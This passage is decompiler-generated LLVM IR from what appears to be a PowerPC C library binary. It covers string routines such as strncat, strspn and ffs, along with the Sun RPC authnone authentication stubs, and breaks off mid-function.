  %v1_1002706c = add i32 %v0_1002706c, 1
  store i32 %v1_1002706c, i32* @r3, align 4
  %v1_10027070 = urem i32 %v1_1002706c, 4
  %v3_10027070 = icmp eq i32 %v1_10027070, 0
  %v0_10027078.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10027070, label %dec_label_pc_10027078, label %dec_label_pc_10027060

dec_label_pc_10027078:                            ; preds = %dec_label_pc_10027060, %entry
  %v0_100270909 = phi i32 [ %v0_100270701, %entry ], [ %v1_1002706c, %dec_label_pc_10027060 ]
  %v0_10027078 = phi i32 [ %v1_10027058, %entry ], [ %v0_10027078.pre, %dec_label_pc_10027060 ]
  %v1_10027078 = mul i32 %v0_10027078, 256
  %v2_10027080 = or i32 %v1_10027078, %v0_10027078
  %v1_10027088 = mul i32 %v2_10027080, 65536
  %v2_1002708c = or i32 %v1_10027088, %v2_10027080
  br label %dec_label_pc_10027090

dec_label_pc_10027090:                            ; preds = %dec_label_pc_100270fc, %dec_label_pc_10027090, %dec_label_pc_10027078
  %v0_100270cc = phi i32 [ %v0_100270909, %dec_label_pc_10027078 ], [ %v1_10027094, %dec_label_pc_10027090 ], [ %v1_10027094, %dec_label_pc_100270fc ]
  %v1_10027090 = inttoptr i32 %v0_100270cc to i32*
  %v2_10027090 = load i32, i32* %v1_10027090, align 4
  %v1_10027094 = add i32 %v0_100270cc, 4
  %v1_10027098 = add i32 %v0_100270cc, 2
  store i32 %v1_10027098, i32* @r8, align 4
  %v2_1002709c = xor i32 %v2_10027090, %v2_1002708c
  %v1_100270a4 = add i32 %v2_1002709c, 2130640639
  %v2_100270a8 = xor i32 %v1_100270a4, %v2_1002709c
  %v1_100270ac = add i32 %v0_100270cc, 1
  store i32 %v1_100270ac, i32* @r11, align 4
  %v2_100270b0 = and i32 %v2_100270a8, -2130640640
  %v6_100270b0 = icmp eq i32 %v2_100270b0, -2130640640
  br i1 %v6_100270b0, label %dec_label_pc_10027090, label %dec_label_pc_100270bc

dec_label_pc_100270bc:                            ; preds = %dec_label_pc_10027090
  %v2_100270bc = inttoptr i32 %v0_100270cc to i8*
  %v3_100270bc = load i8, i8* %v2_100270bc, align 1
  %v4_100270bc = zext i8 %v3_100270bc to i32
  %v1_100270c0 = add i32 %v0_100270cc, 3
  store i32 %v1_100270c0, i32* @r10, align 4
  %v4_100270c4 = icmp eq i32 %v4_100270bc, %v0_10027078
  br i1 %v4_100270c4, label %dec_label_pc_100270cc, label %dec_label_pc_100270d4

dec_label_pc_100270cc:                            ; preds = %dec_label_pc_100270bc
  ret i32 %v0_100270cc

dec_label_pc_100270d4:                            ; preds = %dec_label_pc_100270bc
  %v2_100270d4 = inttoptr i32 %v1_100270ac to i8*
  %v3_100270d4 = load i8, i8* %v2_100270d4, align 1
  %v4_100270d4 = zext i8 %v3_100270d4 to i32
  %v4_100270d8 = icmp eq i32 %v4_100270d4, %v0_10027078
  br i1 %v4_100270d8, label %dec_label_pc_100270e0, label %dec_label_pc_100270e8

dec_label_pc_100270e0:                            ; preds = %dec_label_pc_100270d4
  ret i32 %v1_100270ac

dec_label_pc_100270e8:                            ; preds = %dec_label_pc_100270d4
  %v2_100270e8 = inttoptr i32 %v1_10027098 to i8*
  %v3_100270e8 = load i8, i8* %v2_100270e8, align 1
  %v4_100270e8 = zext i8 %v3_100270e8 to i32
  %v4_100270ec = icmp eq i32 %v4_100270e8, %v0_10027078
  br i1 %v4_100270ec, label %dec_label_pc_100270f4, label %dec_label_pc_100270fc

dec_label_pc_100270f4:                            ; preds = %dec_label_pc_100270e8
  ret i32 %v1_10027098

dec_label_pc_100270fc:                            ; preds = %dec_label_pc_100270e8
  %v2_100270fc = inttoptr i32 %v1_100270c0 to i8*
  %v3_100270fc = load i8, i8* %v2_100270fc, align 1
  %v4_100270fc = zext i8 %v3_100270fc to i32
  %v4_10027100 = icmp eq i32 %v4_100270fc, %v0_10027078
  br i1 %v4_10027100, label %dec_label_pc_10027108, label %dec_label_pc_10027090

dec_label_pc_10027108:                            ; preds = %dec_label_pc_100270fc
  ret i32 %v1_100270c0

; uselistorder directives
  uselistorder i32 %v1_10027094, { 1, 0 }
  uselistorder i32 %v0_100270cc, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_10027080, { 1, 0 }
  uselistorder i32 %v0_10027078, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1002706c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100270701, { 2, 1, 0 }
  uselistorder i32 %v1_10027058, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10027060, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10027114

dec_label_pc_10027114:                            ; preds = %dec_label_pc_10027114, %entry
  %v0_10027114 = phi i32 [ %v1_10027118, %dec_label_pc_10027114 ], [ %tmp, %entry ]
  %v1_10027114 = inttoptr i32 %v0_10027114 to i8*
  %v2_10027114 = load i8, i8* %v1_10027114, align 1
  %v1_10027118 = add i32 %v0_10027114, 1
  store i32 %v1_10027118, i32* %r11.global-to-local, align 4
  %v3_1002711c = icmp eq i8 %v2_10027114, 0
  store i1 %v3_1002711c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1002711c, label %dec_label_pc_10027124, label %dec_label_pc_10027114

dec_label_pc_10027124:                            ; preds = %dec_label_pc_10027114
  %v3_10027124 = icmp eq i32 %arg2, 3
  store i1 %v3_10027124, i1* %cr7_eq.global-to-local, align 1
  %v1_10027128 = add i32 %v0_10027114, -1
  store i32 %v1_10027128, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_100271c4, label %dec_label_pc_10027134

dec_label_pc_10027134:                            ; preds = %dec_label_pc_10027124
  %v1_10027134 = udiv i32 %arg2, 4
  store i32 %v1_10027134, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1002713c

dec_label_pc_1002713c:                            ; preds = %dec_label_pc_1002713c.dec_label_pc_1002713c_crit_edge, %dec_label_pc_10027134
  %v2_1002714c = phi i32 [ %v0_10027140.pre, %dec_label_pc_1002713c.dec_label_pc_1002713c_crit_edge ], [ %v1_10027128, %dec_label_pc_10027134 ]
  %v0_1002713c = load i32, i32* @r4, align 4
  %v1_1002713c = inttoptr i32 %v0_1002713c to i8*
  %v2_1002713c = load i8, i8* %v1_1002713c, align 1
  %v1_10027140 = add i32 %v2_1002714c, 1
  store i32 %v1_10027140, i32* %r9.global-to-local, align 4
  %v1_10027144 = add i32 %v2_1002714c, 2
  store i32 %v1_10027144, i32* %r7.global-to-local, align 4
  %v3_10027148 = icmp eq i8 %v2_1002713c, 0
  store i1 %v3_10027148, i1* %cr7_eq.global-to-local, align 1
  %v4_1002714c = inttoptr i32 %v1_10027140 to i8*
  store i8 %v2_1002713c, i8* %v4_1002714c, align 1
  %v0_10027150 = load i32, i32* @r4, align 4
  %v1_10027150 = add i32 %v0_10027150, 1
  store i32 %v1_10027150, i32* %r11.global-to-local, align 4
  %v0_10027154 = load i32, i32* @lr, align 4
  %v1_10027154 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10027154, i32 %v0_10027154)
  %v0_10027158 = load i32, i32* @r4, align 4
  %v1_10027158 = add i32 %v0_10027158, 1
  %v2_10027158 = inttoptr i32 %v1_10027158 to i8*
  %v3_10027158 = load i8, i8* %v2_10027158, align 1
  %v0_1002715c = load i32, i32* %r11.global-to-local, align 4
  %v1_1002715c = add i32 %v0_1002715c, 1
  store i32 %v1_1002715c, i32* @r8, align 4
  %v0_10027160 = load i32, i32* %r7.global-to-local, align 4
  %v1_10027160 = add i32 %v0_10027160, 1
  store i32 %v1_10027160, i32* @r10, align 4
  %v3_10027164 = icmp eq i8 %v3_10027158, 0
  store i1 %v3_10027164, i1* %cr7_eq.global-to-local, align 1
  %v2_10027168 = load i32, i32* %r9.global-to-local, align 4
  %v3_10027168 = add i32 %v2_10027168, 1
  %v4_10027168 = inttoptr i32 %v3_10027168 to i8*
  store i8 %v3_10027158, i8* %v4_10027168, align 1
  %v0_1002716c = load i32, i32* @r8, align 4
  %v1_1002716c = add i32 %v0_1002716c, 1
  store i32 %v1_1002716c, i32* %r9.global-to-local, align 4
  %v1_10027170 = add i32 %v0_1002716c, 2
  store i32 %v1_10027170, i32* @r4, align 4
  %v0_10027174 = load i32, i32* @lr, align 4
  %v1_10027174 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10027174, i32 %v0_10027174)
  %v0_10027178 = load i32, i32* %r11.global-to-local, align 4
  %v1_10027178 = add i32 %v0_10027178, 1
  %v2_10027178 = inttoptr i32 %v1_10027178 to i8*
  %v3_10027178 = load i8, i8* %v2_10027178, align 1
  %v0_1002717c = load i32, i32* @r10, align 4
  %v1_1002717c = add i32 %v0_1002717c, 1
  store i32 %v1_1002717c, i32* %r11.global-to-local, align 4
  %v3_10027180 = icmp eq i8 %v3_10027178, 0
  store i1 %v3_10027180, i1* %cr7_eq.global-to-local, align 1
  %v2_10027184 = load i32, i32* %r7.global-to-local, align 4
  %v3_10027184 = add i32 %v2_10027184, 1
  %v4_10027184 = inttoptr i32 %v3_10027184 to i8*
  store i8 %v3_10027178, i8* %v4_10027184, align 1
  %v0_10027188 = load i32, i32* @lr, align 4
  %v1_10027188 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10027188, i32 %v0_10027188)
  %v0_1002718c = load i32, i32* @r8, align 4
  %v1_1002718c = add i32 %v0_1002718c, 1
  %v2_1002718c = inttoptr i32 %v1_1002718c to i8*
  %v3_1002718c = load i8, i8* %v2_1002718c, align 1
  %v4_1002718c = zext i8 %v3_1002718c to i32
  store i32 %v4_1002718c, i32* %r9.global-to-local, align 4
  %v3_10027190 = icmp eq i8 %v3_1002718c, 0
  store i1 %v3_10027190, i1* %cr7_eq.global-to-local, align 1
  %v2_10027194 = load i32, i32* @r10, align 4
  %v3_10027194 = add i32 %v2_10027194, 1
  %v4_10027194 = inttoptr i32 %v3_10027194 to i8*
  store i8 %v3_1002718c, i8* %v4_10027194, align 1
  %v0_10027198 = load i32, i32* @lr, align 4
  %v1_10027198 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10027198, i32 %v0_10027198)
  %v0_1002719c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1002719c = add i32 %v0_1002719c, -1
  store i32 %v1_1002719c, i32* %ctr.global-to-local, align 4
  %v2_1002719c = icmp eq i32 %v1_1002719c, 0
  br i1 %v2_1002719c, label %dec_label_pc_100271a0, label %dec_label_pc_1002713c.dec_label_pc_1002713c_crit_edge

dec_label_pc_1002713c.dec_label_pc_1002713c_crit_edge: ; preds = %dec_label_pc_1002713c
  %v0_10027140.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1002713c

dec_label_pc_100271a0:                            ; preds = %dec_label_pc_1002713c
  %v0_100271a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100271a0 = urem i32 %v0_100271a0, 4
  store i32 %v1_100271a0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100271c4

dec_label_pc_100271a8:                            ; preds = %dec_label_pc_100271c4, %dec_label_pc_100271a8.dec_label_pc_100271a8_crit_edge
  %v0_100271ac = phi i32 [ %v0_100271ac.pre, %dec_label_pc_100271a8.dec_label_pc_100271a8_crit_edge ], [ %v0_100271c4, %dec_label_pc_100271c4 ]
  %v0_100271a8 = load i32, i32* @r4, align 4
  %v1_100271a8 = inttoptr i32 %v0_100271a8 to i8*
  %v2_100271a8 = load i8, i8* %v1_100271a8, align 1
  %v3_100271a8 = zext i8 %v2_100271a8 to i32
  store i32 %v3_100271a8, i32* %r9.global-to-local, align 4
  %v1_100271ac = add i32 %v0_100271ac, -1
  store i32 %v1_100271ac, i32* %r5.global-to-local, align 4
  %v1_100271b0 = add i32 %v0_100271a8, 1
  store i32 %v1_100271b0, i32* @r4, align 4
  %v3_100271b4 = icmp eq i8 %v2_100271a8, 0
  store i1 %v3_100271b4, i1* %cr7_eq.global-to-local, align 1
  %v2_100271b8 = load i32, i32* %r11.global-to-local, align 4
  %v3_100271b8 = add i32 %v2_100271b8, 1
  %v4_100271b8 = inttoptr i32 %v3_100271b8 to i8*
  store i8 %v2_100271a8, i8* %v4_100271b8, align 1
  store i32 %v3_100271b8, i32* %r11.global-to-local, align 4
  %v0_100271bc = load i32, i32* @lr, align 4
  %v1_100271bc = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100271bc, i32 %v0_100271bc)
  %v0_100271cc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100271cc = add i32 %v0_100271cc, -1
  store i32 %v1_100271cc, i32* %ctr.global-to-local, align 4
  %v2_100271cc = icmp eq i32 %v1_100271cc, 0
  br i1 %v2_100271cc, label %dec_label_pc_100271d0, label %dec_label_pc_100271a8.dec_label_pc_100271a8_crit_edge

dec_label_pc_100271a8.dec_label_pc_100271a8_crit_edge: ; preds = %dec_label_pc_100271a8
  %v0_100271ac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100271a8

dec_label_pc_100271c4:                            ; preds = %dec_label_pc_10027124, %dec_label_pc_100271a0
  %v0_100271c4 = phi i32 [ %arg2, %dec_label_pc_10027124 ], [ %v1_100271a0, %dec_label_pc_100271a0 ]
  store i32 %v0_100271c4, i32* %ctr.global-to-local, align 4
  %v2_100271cc3 = icmp eq i32 %v0_100271c4, 0
  br i1 %v2_100271cc3, label %dec_label_pc_100271d0, label %dec_label_pc_100271a8

dec_label_pc_100271d0:                            ; preds = %dec_label_pc_100271a8, %dec_label_pc_100271c4
  %v0_100271d0 = load i32, i32* %r9.global-to-local, align 4
  %v3_100271d0 = icmp eq i32 %v0_100271d0, 0
  store i1 %v3_100271d0, i1* %cr7_eq.global-to-local, align 1
  %v0_100271d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100271d0, i32 %v0_100271d4)
  %v0_100271d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100271d8 = trunc i32 %v0_100271d8 to i8
  %v2_100271d8 = load i32, i32* %r11.global-to-local, align 4
  %v3_100271d8 = add i32 %v2_100271d8, 1
  %v4_100271d8 = inttoptr i32 %v3_100271d8 to i8*
  store i8 %v1_100271d8, i8* %v4_100271d8, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_100271c4, { 1, 2, 0 }
  uselistorder i32 %v1_100271cc, { 1, 0 }
  uselistorder i32 %v1_100271a0, { 1, 0 }
  uselistorder i32 %v1_1002719c, { 1, 0 }
  uselistorder i32 %v2_1002714c, { 1, 0 }
  uselistorder i32 %v1_10027118, { 1, 0 }
  uselistorder i32 %v0_10027114, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_100271d0, { 1, 0 }
  uselistorder label %dec_label_pc_100271c4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @r10, align 4
  %v0_100272101 = load i32, i32* @r3, align 4
  %v1_100272102 = inttoptr i32 %v0_100272101 to i8*
  %v2_100272103 = load i8, i8* %v1_100272102, align 1
  %v3_100272104 = zext i8 %v2_100272103 to i32
  store i32 %v3_100272104, i32* @r11, align 4
  %v3_100272146 = icmp eq i8 %v2_100272103, 0
  br i1 %v3_100272146, label %dec_label_pc_10027224, label %dec_label_pc_1002721c

dec_label_pc_100271ec:                            ; preds = %dec_label_pc_100271ec, %dec_label_pc_1002721c
  %v0_100271ec = phi i32 [ %v1_100271f0, %dec_label_pc_100271ec ], [ %tmp, %dec_label_pc_1002721c ]
  %v1_100271ec = inttoptr i32 %v0_100271ec to i8*
  %v2_100271ec = load i8, i8* %v1_100271ec, align 1
  %v3_100271ec = zext i8 %v2_100271ec to i32
  %v1_100271f0 = add i32 %v0_100271ec, 1
  %v3_100271f4 = icmp eq i8 %v2_100271ec, 0
  %v4_100271f8 = icmp eq i32 %v0_100271f88, %v3_100271ec
  %brmerge = or i1 %v3_100271f4, %v4_100271f8
  br i1 %brmerge, label %dec_label_pc_10027200, label %dec_label_pc_100271ec

dec_label_pc_10027200:                            ; preds = %dec_label_pc_100271ec
  br i1 %v3_100271f4, label %dec_label_pc_10027224, label %dec_label_pc_10027208

dec_label_pc_10027208:                            ; preds = %dec_label_pc_10027200
  %v1_10027208 = add i32 %v0_10027208, 1
  store i32 %v1_10027208, i32* @r10, align 4
  %v1_1002720c = add i32 %v0_1002720c, 1
  %v1_10027210 = inttoptr i32 %v1_1002720c to i8*
  %v2_10027210 = load i8, i8* %v1_10027210, align 1
  %v3_10027210 = zext i8 %v2_10027210 to i32
  store i32 %v3_10027210, i32* @r11, align 4
  %v3_10027214 = icmp eq i8 %v2_10027210, 0
  br i1 %v3_10027214, label %dec_label_pc_10027224, label %dec_label_pc_1002721c

dec_label_pc_1002721c:                            ; preds = %entry, %dec_label_pc_10027208
  %v0_1002720c = phi i32 [ %v1_1002720c, %dec_label_pc_10027208 ], [ %v0_100272101, %entry ]
  %v0_10027208 = phi i32 [ %v1_10027208, %dec_label_pc_10027208 ], [ 0, %entry ]
  %v0_100271f88 = phi i32 [ %v3_10027210, %dec_label_pc_10027208 ], [ %v3_100272104, %entry ]
  br label %dec_label_pc_100271ec

dec_label_pc_10027224:                            ; preds = %dec_label_pc_10027208, %dec_label_pc_10027200, %entry
  %v0_10027224 = phi i32 [ 0, %entry ], [ %v1_10027208, %dec_label_pc_10027208 ], [ %v0_10027208, %dec_label_pc_10027200 ]
  ret i32 %v0_10027224

; uselistorder directives
  uselistorder i32 %v0_100271ec, { 1, 0 }
  uselistorder i32* @r11, { 35, 20, 36, 55, 56, 57, 99, 100, 3, 94, 95, 6, 96, 97, 37, 38, 58, 59, 60, 61, 62, 46, 47, 48, 49, 63, 64, 65, 66, 107, 108, 109, 7, 8, 110, 67, 69, 9, 4, 70, 68, 39, 40, 41, 42, 111, 112, 113, 102, 103, 0, 118, 101, 21, 71, 72, 50, 73, 45, 10, 123, 124, 125, 126, 127, 128, 129, 130, 75, 11, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 74, 88, 89, 90, 91, 92, 93, 31, 32, 52, 119, 120, 121, 15, 16, 115, 12, 116, 117, 17, 27, 28, 122, 18, 19, 23, 24, 25, 26, 22, 98, 106, 51, 1, 5, 2, 105, 29, 104, 13, 114, 14, 30, 33, 34, 43, 44, 53, 54 }
  uselistorder label %dec_label_pc_1002721c, { 1, 0 }
  uselistorder label %dec_label_pc_100271ec, { 1, 0 }
}

define i32 @ffs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1002722c = urem i32 %arg1, 65536
  %v3_10027234 = icmp eq i32 %v1_1002722c, 0
  br i1 %v3_10027234, label %dec_label_pc_1002723c, label %dec_label_pc_10027244

dec_label_pc_1002723c:                            ; preds = %entry
  %v4_1002723c = sdiv i32 %arg1, 65536
  br label %dec_label_pc_10027244

dec_label_pc_10027244:                            ; preds = %entry, %dec_label_pc_1002723c
  %v0_10027254 = phi i32 [ %arg1, %entry ], [ %v4_1002723c, %dec_label_pc_1002723c ]
  %v0_10027250 = phi i32 [ 1, %entry ], [ 17, %dec_label_pc_1002723c ]
  %v1_10027244 = urem i32 %v0_10027254, 256
  %v3_10027248 = icmp eq i32 %v1_10027244, 0
  br i1 %v3_10027248, label %dec_label_pc_10027250, label %dec_label_pc_1002725c

dec_label_pc_10027250:                            ; preds = %dec_label_pc_10027244
  %v1_10027250 = or i32 %v0_10027250, 8
  %v4_10027254 = sdiv i32 %v0_10027254, 256
  br label %dec_label_pc_1002725c

dec_label_pc_1002725c:                            ; preds = %dec_label_pc_10027244, %dec_label_pc_10027250
  %v0_10027264 = phi i32 [ %v0_10027250, %dec_label_pc_10027244 ], [ %v1_10027250, %dec_label_pc_10027250 ]
  %v0_10027268 = phi i32 [ %v0_10027254, %dec_label_pc_10027244 ], [ %v4_10027254, %dec_label_pc_10027250 ]
  %v1_1002725c = urem i32 %v0_10027268, 16
  %v3_1002725c = icmp eq i32 %v1_1002725c, 0
  br i1 %v3_1002725c, label %dec_label_pc_10027264, label %dec_label_pc_10027270

dec_label_pc_10027264:                            ; preds = %dec_label_pc_1002725c
  %v1_10027264 = add nsw i32 %v0_10027264, 4
  %v4_10027268 = sdiv i32 %v0_10027268, 16
  %v1_1002726c = urem i32 %v1_10027264, 256
  br label %dec_label_pc_10027270

dec_label_pc_10027270:                            ; preds = %dec_label_pc_1002725c, %dec_label_pc_10027264
  %v0_10027278 = phi i32 [ %v0_10027264, %dec_label_pc_1002725c ], [ %v1_1002726c, %dec_label_pc_10027264 ]
  %v0_1002727c = phi i32 [ %v0_10027268, %dec_label_pc_1002725c ], [ %v4_10027268, %dec_label_pc_10027264 ]
  %v1_10027270 = urem i32 %v0_1002727c, 4
  %v3_10027270 = icmp eq i32 %v1_10027270, 0
  br i1 %v3_10027270, label %dec_label_pc_10027278, label %dec_label_pc_10027284

dec_label_pc_10027278:                            ; preds = %dec_label_pc_10027270
  %v1_10027278 = add nsw i32 %v0_10027278, 2
  %v4_1002727c = sdiv i32 %v0_1002727c, 4
  %v1_10027280 = urem i32 %v1_10027278, 256
  br label %dec_label_pc_10027284

dec_label_pc_10027284:                            ; preds = %dec_label_pc_10027270, %dec_label_pc_10027278
  %v0_10027298 = phi i32 [ %v1_10027280, %dec_label_pc_10027278 ], [ %v0_10027278, %dec_label_pc_10027270 ]
  %v0_10027290 = phi i32 [ %v4_1002727c, %dec_label_pc_10027278 ], [ %v0_1002727c, %dec_label_pc_10027270 ]
  %v3_10027284 = icmp eq i32 %v0_10027290, 0
  br i1 %v3_10027284, label %dec_label_pc_1002729c, label %dec_label_pc_10027290

dec_label_pc_10027290:                            ; preds = %dec_label_pc_10027284
  %v1_10027290 = urem i32 %v0_10027290, 2
  %v1_10027294 = xor i32 %v1_10027290, 1
  %v2_10027298 = add nsw i32 %v1_10027294, %v0_10027298
  br label %dec_label_pc_1002729c

dec_label_pc_1002729c:                            ; preds = %dec_label_pc_10027284, %dec_label_pc_10027290
  %storemerge = phi i32 [ %v2_10027298, %dec_label_pc_10027290 ], [ 0, %dec_label_pc_10027284 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1002727c, { 2, 0, 1 }
  uselistorder i32 %v0_10027268, { 2, 0, 1 }
  uselistorder i32 %v0_10027250, { 1, 0 }
  uselistorder i32 %v0_10027254, { 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1002729c, { 1, 0 }
  uselistorder label %dec_label_pc_10027284, { 1, 0 }
  uselistorder label %dec_label_pc_10027270, { 1, 0 }
  uselistorder label %dec_label_pc_1002725c, { 1, 0 }
  uselistorder label %dec_label_pc_10027244, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_100272a4 = load i32, i32* @r3, align 4
  ret i32 %v0_100272a4
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_100272b8 = load i32, i32* @r3, align 4
  ret i32 %v0_100272b8
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268595924, i32* @lr, align 4
  %v0_100272d0 = call i32 @__rpc_thread_variables()
  store i32 %v0_100272d0, i32* %r3.global-to-local, align 4
  %v1_100272d4 = add i32 %v0_100272d0, 152
  %v2_100272d4 = inttoptr i32 %v1_100272d4 to i32*
  %v3_100272d4 = load i32, i32* %v2_100272d4, align 4
  %v0_100272dc = load i32, i32* @r31, align 4
  store i32 %v0_100272dc, i32* %r3.global-to-local, align 4
  %v3_100272e0 = icmp eq i32 %v3_100272d4, 0
  br i1 %v3_100272e0, label %dec_label_pc_10027304, label %dec_label_pc_100272ec

dec_label_pc_100272ec:                            ; preds = %entry
  %v1_100272ec = add i32 %v0_100272dc, 4
  %v2_100272ec = inttoptr i32 %v1_100272ec to i32*
  %v3_100272ec = load i32, i32* %v2_100272ec, align 4
  %v1_100272f4 = add i32 %v3_100272ec, 12
  %v2_100272f4 = inttoptr i32 %v1_100272f4 to i32*
  %v3_100272f4 = load i32, i32* %v2_100272f4, align 4
  call void @__pseudo_call(i32 %v3_100272f4)
  %v0_10027300 = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10027304

dec_label_pc_10027304:                            ; preds = %entry, %dec_label_pc_100272ec
  %v0_10027304 = phi i32 [ 0, %entry ], [ %v0_10027300, %dec_label_pc_100272ec ]
  store i32 %v0_10027304, i32* %r3.global-to-local, align 4
  ret i32 %v0_10027304

; uselistorder directives
  uselistorder i32 %v0_10027304, { 1, 0 }
  uselistorder label %dec_label_pc_10027304, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  store i32 268596016, i32* @lr, align 4
  %v0_1002732c = call i32 @__rpc_thread_variables()
  %v1_10027330 = add i32 %v0_1002732c, 152
  %v2_10027330 = inttoptr i32 %v1_10027330 to i32*
  %v3_10027330 = load i32, i32* %v2_10027330, align 4
  store i32 %v3_10027330, i32* @r31, align 4
  %v3_10027340 = icmp eq i32 %v3_10027330, 0
  br i1 %v3_10027340, label %dec_label_pc_10027348, label %dec_label_pc_1002735c

dec_label_pc_10027348:                            ; preds = %entry
  store i32 268596044, i32* @lr, align 4
  %v2_10027348 = call i32 @calloc(i32 1, i32 64)
  store i32 %v2_10027348, i32* @r31, align 4
  %v3_1002734c = icmp eq i32 %v2_10027348, 0
  br i1 %v3_1002734c, label %dec_label_pc_100273f8, label %dec_label_pc_10027358

dec_label_pc_10027358:                            ; preds = %dec_label_pc_10027348
  %v1_10027358 = load i32, i32* @r30, align 4
  %v2_10027358 = add i32 %v1_10027358, 152
  %v3_10027358 = inttoptr i32 %v2_10027358 to i32*
  store i32 %v2_10027348, i32* %v3_10027358, align 4
  %v0_1002735c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1002735c

dec_label_pc_1002735c:                            ; preds = %entry, %dec_label_pc_10027358
  %v1_10027390 = phi i32 [ %v3_10027330, %entry ], [ %v0_1002735c.pre, %dec_label_pc_10027358 ]
  %v1_1002735c = add i32 %v1_10027390, 60
  %v2_1002735c = inttoptr i32 %v1_1002735c to i32*
  %v3_1002735c = load i32, i32* %v2_1002735c, align 4
  %v2_10027360 = ptrtoint i32* %stack_var_-56 to i32
  %v1_10027364 = add i32 %v1_10027390, 12
  store i32 %v1_10027364, i32* @r30, align 4
  %v3_1002736c = icmp eq i32 %v3_1002735c, 0
  br i1 %v3_1002736c, label %dec_label_pc_10027378, label %dec_label_pc_100273f4

dec_label_pc_10027378:                            ; preds = %dec_label_pc_1002735c
  %v1_10027370 = add i32 %v1_10027390, 40
  %v2_10027390 = add i32 %v1_10027390, 32
  %v3_10027390 = inttoptr i32 %v2_10027390 to i32*
  store i32 ptrtoint (i32* @global_var_1002fb88.1397 to i32), i32* %v3_10027390, align 4
  %v5_100273a4 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v1_10027370, i32 20, i32 0)
  %v0_100273a8 = load i32, i32* @r31, align 4
  store i32 %v0_100273a8, i32* @r4, align 4
  store i32 %v2_10027360, i32* @r3, align 4
  store i32 268596148, i32* @lr, align 4
  %v0_100273b0 = call i32 @xdr_opaque_auth()
  %v0_100273b4 = load i32, i32* @r30, align 4
  store i32 %v0_100273b4, i32* @r4, align 4
  store i32 %v2_10027360, i32* @r3, align 4
  store i32 268596160, i32* @lr, align 4
  %v0_100273bc = call i32 @xdr_opaque_auth()
  %v1_100273c8 = add i32 %tmp, 16
  %v2_100273c8 = inttoptr i32 %v1_100273c8 to i32*
  %v3_100273c8 = load i32, i32* %v2_100273c8, align 4
  call void @__pseudo_call(i32 %v3_100273c8)
  %v1_100273d4 = load i32, i32* @r31, align 4
  %v2_100273d4 = add i32 %v1_100273d4, 60
  %v3_100273d4 = inttoptr i32 %v2_100273d4 to i32*
  store i32 %v2_10027360, i32* %v3_100273d4, align 4
  %v1_100273e0 = add i32 %tmp, 28
  %v2_100273e0 = inttoptr i32 %v1_100273e0 to i32*
